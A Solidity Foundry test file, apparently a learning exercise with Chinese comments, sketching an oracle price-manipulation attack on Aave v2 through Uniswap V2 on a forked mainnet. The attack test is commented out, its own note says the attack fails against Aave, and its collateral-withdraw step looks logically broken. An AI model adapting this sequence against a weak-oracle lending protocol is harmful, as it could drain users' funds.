// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// ===== Aave v2 LendingPoolD25.sol 官方接口(简化版) =====
interface IAaveV2LendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function withdraw(
        address asset,
        uint256 daiBal,
        address attacker
    ) external;

    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralETH,
        uint256 totalDebtETH,
        uint256 availableBorrowsETH,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

/// ===== Uniswap V2 Router部分接口 =====
interface IUniswapV2Router02 {
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

/// ===== Aave v2 LendingPoolAddressesProvider 接口 =====
interface ILendingPoolAddressesProvider {
    function getLendingPool() external view returns (address);
}

//contract PriceManipulationTest is Test {
//
//    IUniswapV2Router02 router;
//    IERC20 token;
//    address WETH;
//    IAaveV2LendingPool lending;
//    address attacker;
//
//    function setUp() public {
//        // 主网 Uniswap V2 Router
//        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
//
//        // 我们用 DAI 作为抵押资产
//        token = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); // DAI
//
//        // 通过 Aave v2 AddressesProvider 获取最新 LendingPoolD25.sol 地址
//        ILendingPoolAddressesProvider provider =
//                        ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5);
//
//        address lendingPoolAddr = provider.getLendingPool();
//        console.log("Fetched Aave v2 LendingPoolD25.sol Address:", lendingPoolAddr);
//
//        lending = IAaveV2LendingPool(lendingPoolAddr);
//
//        // 主网 WETH 地址
//        WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//
//        // 攻击者账号
//        attacker = address(this);
//        vm.deal(attacker, 500 ether);
//    }
//
//    /*
//     *  forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/<你的API> --fork-block-number 16700000  --match-test testPriceManipulationAttack -vvv
//     *
//     *  备注：当前例子中，监控系数会导致攻击失败，需要部署一个弱预言机的借贷合约
//     */
//    function testPriceManipulationAttack() public {
//        vm.startPrank(attacker);
//
//        // 批准 Uniswap Router 和 Aave LendingPoolD25.sol 操作代币
//        token.approve(address(router), type(uint256).max);
//        token.approve(address(lending), type(uint256).max);
//
//        /** ① 操纵价格：用大量 ETH 换 DAI **/
//        address[] memory path = new address[](2);
//        path[0] = WETH;
//        path[1] = address(token);
//
//        router.swapExactETHForTokens{value: 400 ether}(
//            0,
//            path,
//            attacker,
//            block.timestamp + 300
//        );
//
//        uint256 daiBal = token.balanceOf(attacker);
//        console.log("Bought DAI:", daiBal);
//
//        /** ② 存入抵押品 **/
//        lending.deposit(address(token), daiBal, attacker, 0);
//
//        /** ③ 借出 WETH */
//        lending.borrow(WETH, 100 ether, 2, 0, attacker);
//
//        /** ④ 取回抵押品（withdraw 修复余额不足问题） **/
//        lending.withdraw(address(token), daiBal, attacker);
//
//        /** ⑤ 卖出 DAI 恢复价格 **/
//        path[0] = address(token);
//        path[1] = WETH;
//
//        router.swapExactTokensForETH(
//            daiBal,
//            0,
//            path,
//            attacker,
//            block.timestamp + 300
//        );
//
//        vm.stopPrank();
//
//        console.log("Final ETH balance of attacker:", attacker.balance);
//    }
//}